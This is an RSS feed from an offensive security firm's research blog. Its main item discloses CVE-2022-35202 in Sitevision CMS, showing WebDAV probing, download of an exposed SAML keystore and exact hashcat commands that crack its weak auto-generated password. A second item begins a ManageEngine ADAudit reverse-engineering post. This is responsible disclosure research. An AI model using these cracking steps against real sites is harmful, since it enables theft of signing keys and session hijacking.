<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Research on Shelltrail - Swedish offensive security experts</title>
    <link>https://www.shelltrail.com/research/</link>
    <description>Recent content in Research on Shelltrail - Swedish offensive security experts</description>
    <generator>Source Themes academia (https://sourcethemes.com/academic/)</generator>
    <language>en-us</language>
    <copyright>Copyright &amp;copy; {year}</copyright>
    <lastBuildDate>Mon, 10 Feb 2025 00:00:00 +0000</lastBuildDate>
    
	    <atom:link href="https://www.shelltrail.com/research/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>How auto-generated passwords in Sitevision leads to signing key leakage - CVE-2022-35202</title>
      <link>https://www.shelltrail.com/research/how-auto-generated-passwords-in-sitevision-leads-to-signing-key-leakage-cve-2022-35202/</link>
      <pubDate>Mon, 10 Feb 2025 00:00:00 +0000</pubDate>
      
      <guid>https://www.shelltrail.com/research/how-auto-generated-passwords-in-sitevision-leads-to-signing-key-leakage-cve-2022-35202/</guid>
      <description>&lt;h2 id=&#34;tldr&#34;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;A security issue in Sitevision version 10.3.1 and older allows a remote attacker,
in certain (non-default) scenarios, to gain access to the private keys used
for signing SAML Authn requests.
The underlying issue is a Java keystore that may become accessible and
downloadable via WebDAV. This keystore is
protected with a low-complexity, auto-generated password.&lt;/p&gt;
&lt;p&gt;The severity of this vulnerability is difficult to assess and cannot be
evaluated trough Sitevision configuration,
as it is up to the SAML Identity Provider (IdP) in a SAML flow whether signed Authn requests should
have precedence over SAML Service Provider Metadata.&lt;/p&gt;
&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;As a security consultant in Sweden you have most likely encountered Sitevision
whether you know it or not. Sitevision is a Swedish based company providing a
CMS solution which is used by many of
Swedens 290 (but who is counting) municipalities as well as many other private companies and
government entities internationally.&lt;/p&gt;
&lt;p&gt;The product is often used as the main web site for the companies but can very
well be customized to provide other types of business logics such as intranet,
staff scheduling or news portals to name a few.&lt;/p&gt;
&lt;p&gt;The easiest way to determine if you are dealing with a Sitevision site is to
look for the &lt;code&gt;SiteVisionLTM&lt;/code&gt; cookie or the fairly unique way of presenting
URL paths:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;cookie.png&#34; alt=&#34;Picture of a common response from a Stevision site&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;authentication-speed-run&#34;&gt;Authentication speed-run&lt;/h2&gt;
&lt;p&gt;Sitevision sites allow anonymous users to browse deployed websites when
it is intended to be public. If sensitive information needs to be protected,
authentication can be achieved in multiple ways according to their documentation.
During this post we will only discuss the SAML 2 implementation.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;sitevision_auth.png&#34; alt=&#34;Image displaying options for authenting users in Siteivision&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;content-delivery-webdav&#34;&gt;Content delivery (WebDAV)&lt;/h2&gt;
&lt;p&gt;Sitevision leverages WebDAV to manage and deliver content to users who either browse
or administers the site. WebDAV is an extension of the Hypertext Transfer
Protocol (HTTP) that enable collaborative access to files on a web-server
which is a fundamental feature for a CMS such as Sitevision. WebDAV can basically be explained
as a file-share over HTTP.&lt;/p&gt;
&lt;p&gt;WebDAV is an interesting attack surface as it uses custom HTTP verbs
which is less commonly searched enumerated when doing OSINT or attack surface scanning.
If WebDAV is not configured properly, this may give an attacker directory
listing on exposed directories.&lt;/p&gt;
&lt;p&gt;In order to verify if WebDAV is used, a &lt;code&gt;HTTP OPTIONS&lt;/code&gt; request can be sent to a known
path of a web-server, and if the server response with for instance
PROPFIND, WebDAV may be in use.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@bounty:~$ curl -X OPTIONS http://localhost/webdav -v
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* Mark bundle as not supporting multiuse
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt; HTTP/1.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt; DAV: 1, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt; Allow: OPTIONS, GET, HEAD, POST, DELETE, TRACE, PROPPATCH, COPY, MOVE, LOCK, UNLOCK, PROPFIND, PUT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt; MS-Author-Via: DAV
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt; Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt; Date: Sun, &lt;span style=&#34;color:#ae81ff&#34;&gt;01&lt;/span&gt; May &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; 20:13:01 GMT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;cadaver&lt;/code&gt;, a Linux terminal tool for browsing WebDAV can be used in order to
list content on a WebDAV instance.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;cadaver.png&#34; alt=&#34;Using the CLI tool cadaver to view contents of a webdav instance&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;discovery&#34;&gt;Discovery&lt;/h2&gt;
&lt;p&gt;So one rainy day, while surfing the internet aimlessly,
with a leisure-oriented relaxation aura, a WebDAV instance appeared out of nothing on a random Sitevision
site. Of course, one&amp;rsquo;s interest in how stuff works took precedence over the leisure surfing and the focus was switched.
While looking into the WebDAV instance, it contained a folder named &lt;code&gt;files&lt;/code&gt;.
Inside this folder a file named &lt;code&gt;saml-keystore&lt;/code&gt; revealed itself and
got the spider-sense tingling.&lt;/p&gt;
&lt;p&gt;So the file located at &lt;code&gt;https://&amp;lt;redacted&amp;gt;/webdav/files/saml-keystore&lt;/code&gt; was downloaded
and inspected. It sure was a Java keystore container which seemed to contain
the public and private key for something named  &lt;em&gt;oiosaml&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;According to the Sitevisions &lt;a href=&#34;https://help.sitevision.se/en/samlSetupHelp.html&#34;&gt;documentation&lt;/a&gt;,
the &lt;code&gt;saml-keystore&lt;/code&gt; is used in SAML authentication flow, and the keystore which protects the private key is
luckily protected with a password.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;saml-keystore.png&#34; alt=&#34;saml-keystore password protected by an automatically generated password&#34;&gt;&lt;/p&gt;
&lt;p&gt;How SAML works requires its own blog post to be explained properly but &lt;a href=&#34;https://auth0.com/blog/how-saml-authentication-works/&#34;&gt;Auth0&lt;/a&gt;
does a good job explaining it.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;saml-keystore&lt;/code&gt; can be viewed with oracle&amp;rsquo;s tool &lt;code&gt;keytool&lt;/code&gt; which is included in java runtime environment (for instance openjdk-17-jre).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@rodalacket:/$ keytool -list -keystore saml-keystore 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Enter keystore password:  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*****************  WARNING WARNING WARNING  *****************
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* The integrity of the information stored in your keystore  *
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* has NOT been verified!  In order to verify its integrity, *
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* you must provide your keystore password.                  *
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*****************  WARNING WARNING WARNING  *****************
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Keystore type: JKS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Keystore provider: SUN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Your keystore contains &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; entry
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;oiosaml, Jan 01, PrivateKeyEntry, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certificate fingerprint &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SHA-256&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: AA:BB:&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:CC:EE:DD
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;The JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard format using &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;keytool -importkeystore -srckeystore saml-keystore -destkeystore saml-keystore -deststoretype pkcs12&amp;#34;&lt;/span&gt;. 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As seen in the above output, the &lt;code&gt;saml-keystore&lt;/code&gt; includes a oiosaml certificate, but
the password is needed to export the private key.&lt;/p&gt;
&lt;h2 id=&#34;automatically-generated-passwords&#34;&gt;Automatically generated passwords&lt;/h2&gt;
&lt;p&gt;Java keystores protect the private key with a password, this password is hashed
and stored in the keystore-file in SHA1 format. This hash can however be extracted from
the keystore with the tool &lt;code&gt;JksPrivkPrepare.jar&lt;/code&gt;&lt;a href=&#34;https://github.com/floyd-fuh/JKS-private-key-cracker-hashcat&#34;&gt; (source)&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@bounty:$ java -jar ./JksPrivkPrepare.jar  saml-keystore
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Alias: oiosaml, algorithm: RSA, keysize or field size: &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$jksprivk$*1234&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...REDACTED...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;5678*oiosaml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;By extracting the password hash from the keystore one is able to attempt
to crack the hash offline using brute force in an attempt to gain access to the plain-text
password. Just for fun, this hash was put on a hashcat password cracking rig
with 5 x RTX 3080:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@rodalacket:$ hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;15500&lt;/span&gt; -a &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; saml-keystore.hash ?a?a?a?a?a -w &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; -O
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;-m 15500&lt;/code&gt; to specify SHA1 hash according to java keystore specifications&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-a 3&lt;/code&gt; instructing hashcat to perform brute force attack&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?a?a?a?a?a&lt;/code&gt; hashcat mask scheme; Meaning all printable ASCII characters with the length of 5.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-w 3&lt;/code&gt; calling &lt;em&gt;Tuned performance profile&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-O&lt;/code&gt; using optimized kernels&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;5 characters ran quick and no password was cracked.&lt;/li&gt;
&lt;li&gt;6 characters ran quick and no password was cracked.&lt;/li&gt;
&lt;li&gt;7 characters ran quick and no password was cracked.&lt;/li&gt;
&lt;li&gt;8 characters began to make the RTX sweat a bit but resulted in a &lt;strong&gt;successful&lt;/strong&gt; password crack!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;cracked.png&#34; alt=&#34;Successful bruteforce attacke on a saml-keystore demo-file&#34;&gt;&lt;/p&gt;
&lt;p&gt;Oh, we now have the private key for the oiosaml key pair. This indicates that
the auto-generation of passwords for the saml-keystore does not comply with a
strong password complexity. By further examining the password it was determined to be limited to
digits and lowercase characters with the length of 8.&lt;/p&gt;
&lt;p&gt;With this low complexity schema it is possible to crack the password on a 4 vCPU i7
virtual machine in less than 15 hours.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;15500&lt;/span&gt; -a &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; saml-keystore.hash -1 ?d?l ?1?1?1?1?1?1?1?1 -w &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; -O
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The initial assumption when obtaining this key pair was that it
could be used to sign arbitrary SAMLResponse authentication
messages and craft arbitrary logins for the Sitevision site. This was however
&lt;strong&gt;NOT&lt;/strong&gt; the case.&lt;/p&gt;
&lt;p&gt;After input from Sitevision employees it was made clear that this key pair is
used to sign SAML Authn requests. An Authn request is the initial request
that starts the SAML flow and is created by the Service Provider (SP), and sent to the Identity Provider (IdP).
This request may or may not be signed and signing is not required by the SAML
specification (defined in the OASIS SAML 2.0 standard),
but it is recommended for security reasons and may be required by
specific Identity Providers (IdPs).&lt;/p&gt;
&lt;h2 id=&#34;impact&#34;&gt;Impact&lt;/h2&gt;
&lt;p&gt;The Authn request that initiates the SAML flow is created by the Service
Provider (which in this case is the Sitevision server) contains a number
of XML attributes. The important one
to note here is the &lt;code&gt;AssertionConsumerServiceURL&lt;/code&gt;. This attribute handles, and
to quote Auth0:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;The SAML URL interface of the service provider, where the Identity provider sends the authentication token&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Basically meaning that the URL specified in the &lt;code&gt;AssertionConsumerServiceURL&lt;/code&gt;
is the location where the final authentication token is sent. An attacker
who manipulates this attribute, and initiates that SAML flow but lets a victim
login via the IdP will gain access to the victims authenticated session.&lt;/p&gt;
&lt;p&gt;The SAML 2.0 Technical Overview explains that the IdP consults its
list of trusted service providers in metadata before issuing the authentication
response. This process involves verifying that the &lt;code&gt;AssertionConsumerServiceURL&lt;/code&gt;
in the Authn request matches the pre-registered endpoint for the SP. If the
Authn request is signed and the signature is valid, the IdP &lt;em&gt;can&lt;/em&gt; trust the &lt;code&gt;AssertionConsumerServiceURL&lt;/code&gt;
specified in the request. However, it is not clear if whether the pre-configured
metadata or signed request have precedence.&lt;/p&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;The weak auto-generated password was a default configuration of Sitevision
until the discovery of this attack chain. An increased password complexity is enforced
from version 10.3.2 and higher. Password rotation is however not performed upon
upgrading Sitevision, leaving Sitevision sites without manual password
rotation vulnerable. The exposure of the &lt;code&gt;saml-keystore&lt;/code&gt; is dependant
on the configuration of the Sitevision site and is not default, but
common.&lt;/p&gt;
&lt;h2 id=&#34;disclosure-and-remediation&#34;&gt;Disclosure and remediation&lt;/h2&gt;
&lt;p&gt;This vulnerability was reported to Sitevision with the following timeline:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2022-05-02: Andreas Vikerup reported the vulnerability to Sitevision via email.&lt;/li&gt;
&lt;li&gt;2022-05-02: Sitevision Confirmation that the report was received and the vulnerability was verified.&lt;/li&gt;
&lt;li&gt;2022-05-05: Sitevision 10.3.2 released. Affected customers notified.&lt;/li&gt;
&lt;li&gt;2022-05-06: Agreement on more that 90 days disclosure due to the sensitive nature of the Sitevision systems.&lt;/li&gt;
&lt;li&gt;2022-07-04: Request for CVE at mitre.org by Andreas Vikerup.&lt;/li&gt;
&lt;li&gt;2022-07-21: &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35202&#34;&gt;CVE-2022-35202&lt;/a&gt; received however never published.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Since the 21th of July 2022 the CVE has been in a reserved state as no public
information exists for the vulnerability. Customers was notified via email and
information regarding the vulnerability was exclusively available to authorized
users through the Sitevision customer web portal. The absence of publicly available
information poses a challenge, as it hinders the ability to reference a known
vulnerability and obtain the necessary details.&lt;/p&gt;
&lt;p&gt;As Sitevision CMS servers provide the Swedish nation with critical services
such as the Swedish Tax Agency, a 90 day disclosure policy was deemed to short. If
this vulnerability became public prior to systems being patched and mitigated
potential illicit activity could have been performed.&lt;/p&gt;
&lt;p&gt;Prior to publication of this blog post Sitevision employees made an effort to
contact all customers with vulnerable configurations multiple times as some
sites still weren&amp;rsquo;t mitigated properly even after more than 2 years passing.&lt;/p&gt;
&lt;p&gt;Thanks to Sitevision for professional communication and special thanks to
CERT-SE (Swedens national Cyber Security Incident Response Team)
for providing recommendations in terms of publishing content that may impact
national infrastructure.&lt;/p&gt;
&lt;p&gt;Follow us on Linkedin (&lt;a href=&#34;https://linkedin.com/company/shelltrail&#34;&gt;https://linkedin.com/company/shelltrail&lt;/a&gt;) for more cybersecurity related content,&lt;/p&gt;
&lt;p&gt;Cheers&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>ManageEngine ADAudit - Reverse engineering Windows RPC to find CVEs - part 1 / RPC</title>
      <link>https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part1/</link>
      <pubDate>Mon, 27 May 2024 00:00:00 +0000</pubDate>
      
      <guid>https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part1/</guid>
      <description>&lt;h2 id=&#34;tldr&#34;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;This research consist of three parts covering different areas namely
developing a custom RPC client, reverse engineering and a bit of cryptography.&lt;/p&gt;
&lt;p&gt;When this research started, the objective was actually to find a new way to
leverage an old CVE, however digging into the product a new rabbit
hole appeared, leading to a new vulnerability.&lt;/p&gt;
&lt;p&gt;This part of the research explains intricate parts of Remote Procedure Calls
(RPC) in Windows environments and how to develop a custom client.&lt;/p&gt;
&lt;p&gt;CVEs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-36036&#34;&gt;https://nvd.nist.gov/vuln/detail/CVE-2024-36036&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-36037&#34;&gt;https://nvd.nist.gov/vuln/detail/CVE-2024-36037&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;ManageEngine is a company with around 50 different products ranging from full
SIEM solutions to Mobile Device Management systems with 280 000+ customers
world-wide. This article will deep-dive into ADAudit Plus, which is a product
used for real-time monitoring of Active Directory, Windows file servers and
Windows configuration change auditing.&lt;/p&gt;
&lt;p&gt;ADAudit can remotely access event logs and other statistics using standard
remote interaction tools available in Windows. However, for comprehensive
visibility and specialized functions on the targeted machines, it is necessary
to install an agent on the audited Windows systems, specifically the
&lt;code&gt;ADAuditPlusAgent&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;When this research started, the objective was actually to find a new way to
leverage an old CVE, however digging into the product a new rabbit
hole appeared, leading to a new vulnerability..&lt;/p&gt;
&lt;p&gt;As the old CVE was fixed, the research had to be conducted on an older version
of ADAudit,
more precisely the &lt;a href=&#34;https://www.manageengine.com/products/active-directory-audit/adaudit-plus-release-notes.html&#34;&gt;version 7050 released December 2021&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ManageEngine have a penchant for building applications on top of Tomcat with Java
which makes it a good target to practice some source code analysis and reverse
engineering. Lets begin digging.&lt;/p&gt;
&lt;h2 id=&#34;methodology&#34;&gt;Methodology&lt;/h2&gt;
&lt;p&gt;For those who are not familiar with Java and decompiling, here is Shelltrail&amp;rsquo;s
methodology:&lt;/p&gt;
&lt;p&gt;Find all .jar files you would like to assess and download them to your
Unix host. The jar files will most likely be stored in the installation
directory of the product that is being assessed.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/adaudit/7$ ls -la
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;total &lt;span style=&#34;color:#ae81ff&#34;&gt;8036&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; user user    &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 .
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; user user    &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:35 ..
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user  &lt;span style=&#34;color:#ae81ff&#34;&gt;997934&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventNetADAPClient.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user   &lt;span style=&#34;color:#ae81ff&#34;&gt;12040&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventnetADAPFilter.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user  &lt;span style=&#34;color:#ae81ff&#34;&gt;139792&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventNetADAPJspClient.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user &lt;span style=&#34;color:#ae81ff&#34;&gt;4534195&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventnetADAPServer.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user   &lt;span style=&#34;color:#ae81ff&#34;&gt;15735&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventnetADAPService.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user   &lt;span style=&#34;color:#ae81ff&#34;&gt;68066&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventnetADAPStartUp.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user  &lt;span style=&#34;color:#ae81ff&#34;&gt;686147&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventNetClientComponents.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user  &lt;span style=&#34;color:#ae81ff&#34;&gt;290027&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventNetClientFramework.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user   &lt;span style=&#34;color:#ae81ff&#34;&gt;65094&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventNetIdiomsGallery.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user  &lt;span style=&#34;color:#ae81ff&#34;&gt;294662&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventNetNPrevalent.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user  &lt;span style=&#34;color:#ae81ff&#34;&gt;104252&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventNetRssLibrary.jar
